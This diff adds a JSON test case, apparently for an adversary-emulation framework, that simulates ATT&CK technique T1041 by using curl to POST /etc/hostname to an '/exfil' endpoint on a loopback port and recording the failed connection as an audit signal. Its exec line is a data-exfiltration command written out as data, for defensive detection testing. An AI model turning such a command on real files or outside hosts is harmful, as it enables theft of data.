@@ -1,0 +1,12 @@
+{
+  "id": "T1041",
+  "name": "Exfiltration Over C2 Channel (loopback POST)",
+  "description": "Exfiltration / TA0010. Simulate exfiltration of /etc/hostname over a C2 channel by POSTing it to a loopback ephemeral port. The request is NEVER routed off the loopback interface. If no listener is running (typical), the POST fails immediately and the envelope captures the failure — that failure IS the audit signal: the technique was exercised without needing a real listener. The hostname is a minimal-PII-leak choice (already publicly visible on most networks).",
+  "platforms": ["linux"],
+  "exec": "echo '--- T1041 loopback exfil POST (127.0.0.1:65002) ---'; curl --max-time 2 -sS -X POST --data-binary @/etc/hostname -w 'http_code=%{http_code} size=%{size_upload}\\n' http://127.0.0.1:65002/exfil 2>&1 || echo 'curl-exit-nonzero (no listener — the connect attempt itself is the audit signal)'; echo 'note: data went to loopback only; nothing off-host'",
+  "expected": {
+    "exit_code": 0,
+    "stdout_contains": "loopback exfil",
+    "stdout_excludes": []
+  }
+}
